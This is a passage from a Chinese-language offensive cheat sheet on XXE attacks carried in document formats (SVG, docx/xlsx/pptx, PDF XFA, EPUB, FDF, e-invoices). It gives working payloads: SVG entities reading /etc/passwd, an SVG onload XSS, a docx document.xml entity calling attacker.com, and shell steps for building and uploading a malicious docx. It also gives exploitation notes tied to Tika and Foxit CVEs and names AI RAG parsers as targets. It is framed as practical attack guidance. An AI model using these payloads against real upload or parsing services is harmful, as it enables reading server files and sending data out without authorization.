## 九、文档类载体全谱系

### 9.1 SVG（文件上传场景，可 XXE+XSS 组合）
```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <text x="10" y="100">&xxe;</text>
</svg>

<!-- SVG XSS（服务端渲染 SVG 到页面时触发）-->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>
```
**实战要点**：SVG 同时是"无头浏览器"（图片处理/OCR/转换服务）的 XXE 入口。

### 9.2 OOXML（docx/xlsx/pptx）
```
docx 结构:
[Content_Types].xml
_rels/.rels
word/document.xml        → 注入 XXE 主战场
word/_rels/document.xml.rels
xl/workbook.xml / xl/worksheets/sheet1.xml
ppt/presentation.xml
```
**构造恶意 docx 步骤：**
```bash
# 1. 解包：unzip normal.docx -d evil/
# 2. 编辑 evil/word/document.xml 插入 XXE 到 <w:t>&xxe;</w:t>（并加 DOCTYPE）
# 3. 重新打包：cd evil && zip -r ../evil.docx .
# 4. 上传到文档解析服务触发
```
```xml
<!-- document.xml 内注入 -->
<?xml version="1.0"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
```
**工具**：oxml_xxe / XXElixir（自动注入 OOXML）。

### 9.3 PDF（XFA 表单 —— 2025 新战场）
```xml
<!-- CVE-2025-66516 Apache Tika（CVSS 10.0）：解析含 XFA 的 PDF 时 XMLStreamReader 未硬化
     影响 tika-core 1.13-3.2.1，修复 ≥3.2.2；全球 565+ 暴露实例 -->
<!-- CVE-2026-57259 Foxit PDF：伪装 PDF 携带外部实体指向本地路径 -->
<!-- 打法：构造含 XFA XML 流的 PDF → 上传到文档解析服务（Tika/在线转换/邮件扫描）-->
```
**构造要点**：PDF 的 AcroForm 中嵌入 XFA XML（`/AcroForm << /XFA (XML 流) >>`），XFA 内放 `<!ENTITY xxe SYSTEM "file:///etc/passwd">`。

### 9.4 EPUB / FDF / ZUGFeRD
```xml
<!-- EPUB：OPF 包描述文件 + XHTML 正文都是 XML -->
<!-- FDF/XFDF：PDF 表单数据文件，XML 格式，文件上传场景 -->
<!-- ZUGFeRD 电子发票：发票 XML 内嵌 PDF（Kivitendo CVE-2025-66370，上传电子发票即 XXE）-->
```
**攻击面总结**：**一切"上传解析"功能都是隐式 XML 入口**——文档解析器（Tika/Poppler/预览服务/OCR/AI RAG）是 2025-2026 高危暴露面。

